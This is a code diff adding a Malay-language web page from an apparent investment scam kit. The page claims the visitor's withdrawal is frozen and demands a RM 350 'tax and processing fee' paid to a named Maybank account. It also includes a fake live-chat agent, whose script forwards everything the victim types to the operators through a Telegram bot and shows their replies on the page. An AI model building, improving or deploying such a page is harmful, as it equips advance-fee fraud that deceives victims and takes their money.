@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="ms">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pengeluaran Disekat</title>
+    <link rel="stylesheet" href="css/style.css">
+</head>
+<body>
+    <div class="card alert-card">
+        <div class="alert-icon">⚠️</div>
+        <h1 style="color: #ef4444; font-size: 22px;">Akaun Disekat Sementara</h1>
+        <p class="subtitle">Sistem mengesan pengeluaran luar tabii. Untuk melindungi dana anda, sila buat pembayaran <b>Cukai & Yuran Pemprosesan</b> sebanyak <b>RM 350.00</b>.</p>
+        
+        <div class="bank-box">
+            <p style="font-size: 12px; color: #8b92a5;">Pindahan Maybank</p>
+            <h3>1540 1234 5678</h3>
+            <p style="font-size: 14px;">Nama: VaultInvest Sdn Bhd</p>
+        </div>
+        <p class="subtitle" style="font-size: 13px; margin-bottom: 0;">Sila hubungi pegawai kewangan kami di Live Chat selepas membuat pembayaran.</p>
+    </div>
+
+    <!-- Live Chat Widget -->
+    <div id="chat-widget" class="chat-widget">
+        <div class="chat-header" id="chat-toggle">
+            <span>💬 Live Support</span>
+            <span id="chat-status" style="font-size: 10px; color: #22c55e;">● Online</span>
+        </div>
+        <div class="chat-body" id="chat-body">
+            <div class="chat-messages" id="chat-messages">
+                <div class="msg agent">Salam, saya Ejen Aiman. Sila buat pembayaran RM350 dan hantar resit di sini untuk pengaktifan segera.</div>
+            </div>
+            <div class="chat-input-area">
+                <input type="text" id="chat-input" placeholder="Taip mesej anda...">
+                <button id="chat-send">Hantar</button>
+            </div>
+        </div>
+    </div>
+
+    <script src="js/config.js"></script>
+    <script>
+        const chatToggle = document.getElementById('chat-toggle');
+        const chatBody = document.getElementById('chat-body');
+        const chatSend = document.getElementById('chat-send');
+        const chatInput = document.getElementById('chat-input');
+        const chatMessages = document.getElementById('chat-messages');
+
+        chatToggle.addEventListener('click', () => { chatBody.classList.toggle('hidden'); });
+
+        async function sendMessageToAdmin(text) {
+            const payload = {
+                chat_id: CONFIG.CHAT_ID,
+                text: `💬 <b>LIVE CHAT DARI WEB</b>\n\n<b>Pesanan:</b> ${text}\n\n<i>(Reply mesej ini di Telegram untuk jawab)</i>`,
+                parse_mode: "HTML"
+            };
+            try {
+                await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
+                    method: "POST", body: new URLSearchParams(payload)
+                });
+            } catch (err) {}
+        }
+
+        async function fetchAdminReply() {
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates`);
+                const data = await res.json();
+                if (data.ok && data.result.length > 0) {
+                    const lastUpdate = data.result[data.result.length - 1];
+                    if (lastUpdate.message && lastUpdate.message.reply_to_message && lastUpdate.message.reply_to_message.text.includes("LIVE CHAT DARI WEB")) {
+                        const replyText = lastUpdate.message.text;
+                        const lastMsg = document.querySelector('.msg.user:last-child');
+                        if (lastMsg && lastMsg.dataset.replied !== 'true') {
+                            lastMsg.dataset.replied = 'true';
+                            appendMessage(replyText, 'agent');
+                        }
+                    }
+                }
+            } catch (err) {}
+        }
+
+        function appendMessage(text, type) {
+            const div = document.createElement('div');
+            div.className = `msg ${type}`;
+            div.textContent = text;
+            chatMessages.appendChild(div);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+        }
+
+        chatSend.addEventListener('click', async () => {
+            const text = chatInput.value.trim();
+            if (!text) return;
+
+            appendMessage(text, 'user');
+            chatInput.value = '';
+            await sendMessageToAdmin(text);
+            
+            const typingDiv = document.createElement('div');
+            typingDiv.className = 'msg agent';
+            typingDiv.textContent = 'Sedang menaip...';
+            typingDiv.id = 'typing';
+            chatMessages.appendChild(typingDiv);
+            chatMessages.scrollTop = chatMessages.scrollHeight;
+
+            setTimeout(() => { if(document.getElementById('typing')) document.getElementById('typing').remove(); }, 3000);
+        });
+
+        chatInput.addEventListener('keypress', (e) => { if (e.key === 'Enter') chatSend.click(); });
+        setInterval(fetchAdminReply, 5000);
+    </script>
+</body>
+</html>
